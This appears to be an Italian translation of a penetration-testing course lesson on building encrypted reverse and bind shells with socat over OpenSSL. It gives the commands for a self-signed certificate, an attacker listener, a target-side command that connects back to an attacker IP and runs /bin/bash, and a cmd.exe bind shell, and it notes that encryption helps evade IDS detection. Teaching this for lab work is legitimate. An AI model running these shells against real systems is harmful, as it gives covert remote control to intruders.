Una delle tante cose fantastiche di **socat** è che è in grado di **creare shell crittografate,** sia **bind** che **reverse**. Perché dovremmo volerlo fare? Le shell crittografate non possono essere spiate a meno che non si abbia la chiave di decrittazione e spesso sono **in grado di bypassare un IDS.**

Basti dire che ogni volta che **`TCP`** è stato usato come parte di un comando, verrà **sostituito** con **`OPENSSL`quando** si **lavora** con **shell crittografate.** 

### Certificati

Per prima cosa dobbiamo **generare** un **certificato** per poter usare shell criptate. È più facile farlo sulla nostra macchina attaccante:

- **`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`**

Questo **comando crea** una **chiave RSA a 2048 bit** con **file** di **certificato corrispondente**, **autofirmata** e **valida** per poco meno di un **anno**. Quando esegui questo comando, ti verrà chiesto di **inserire informazioni** sul **certificato**. **Questo campo** può essere **lasciato vuoto** o **compilato in modo casuale.**

**Dobbiamo quindi unire i due file creati in un unico `.pem`file:**

- **`cat shell.key shell.crt > shell.pem`**

Ora, impostiamo il nostro **listener shell inverso**, utilizziamo:

- **`socat OPENSSL-LISTEN <PORT>,cert=shell.pem,verify=0 -`**

Questo **imposta** un **listener OPENSSL** che **usa** il nostro **certificato generato**. **`verify=0`Indica** alla connessione di **non** preoccuparsi di **provare** a **convalidare** che il nostro **certificato** sia stato firmato correttamente da un'autorità riconosciuta. Si noti che il certificato *deve* essere usato su qualsiasi dispositivo in ascolto.

**Per riconnetterci, useremmo:**

- **`socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`**

### **La stessa tecnica si applicherebbe per una shell bind:**

Bersaglio:

- **`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`**

Attaccante:

- **`socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`**

Tieni presente che anche per una destinazione Windows, il **certificato** deve essere **utilizzato con** il **listener**, **quindi è necessario copiare il file PEM per una shell di associazione.**

**L'immagine** seguente mostra una **shell OPENSSL Reverse** da un target Linux . Come al solito, il target è sulla destra e l'attaccante è sulla sinistra:

![image](https://github.com/user-attachments/assets/daf94691-6070-4d22-8eef-32ad1afb28e7)

Questa tecnica funzionerà anche con la speciale shell TTY solo per Linux trattata nel compito precedente: capire la sintassi per questo sarà la sfida per questo compito.
